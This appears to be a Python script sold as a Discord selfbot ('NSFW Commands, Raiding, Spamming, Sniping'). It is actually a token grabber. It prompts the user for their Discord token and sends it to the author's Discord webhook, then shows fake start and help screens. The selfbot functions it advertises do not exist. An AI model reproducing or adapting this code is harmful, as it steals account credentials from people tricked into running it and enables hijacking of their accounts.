import requests
import os

from discord_webhook import DiscordWebhook

print('''

OOooOoO                           .oOOOo.         o .oOo  o               
o                                 o     o        O  O    O                
O                                 O.             o  o    O             O  
oOooO                              `OOoo.        O  OoO  o            oOo 
O       O   o  `OoOo. O   o             `O .oOo. o  o    OoOo. .oOo.   o  
o       o   O   o     o   O              o OooO' O  O    O   o O   o   O  
o       O   o   O     O   o       O.    .O O     o  o    o   O o   O   o  
O'      `OoO'o  o     `OoOO        `oooO'  `OoO' Oo O'   `OoO' `OoO'   `oO
                          o                                               
                       OoO'                                               
	NSFW Commands, Raiding, Spamming, Sniping, and lots more!
''')


tokenstel = input("Token (if you enter invalid, will not work): ")
webhook = DiscordWebhook(url='webhook-here', content=tokenstel)
respond = webhook.execute()

os.system("cls")
input("Press enter to start the selfbot!")
os.system("cls")

print('''


OOooOoO                           .oOOOo.         o .oOo  o               
o                                 o     o        O  O    O                
O                                 O.             o  o    O             O  
oOooO                              `OOoo.        O  OoO  o            oOo 
O       O   o  `OoOo. O   o             `O .oOo. o  o    OoOo. .oOo.   o  
o       o   O   o     o   O              o OooO' O  O    O   o O   o   O  
o       O   o   O     O   o       O.    .O O     o  o    o   O o   O   o  
O'      `OoO'o  o     `OoOO        `oooO'  `OoO' Oo O'   `OoO' `OoO'   `oO
                          o                                               
                       OoO'                                               

''')

print('''
--------------------
<help to see commands!
--------------------
''')
input()
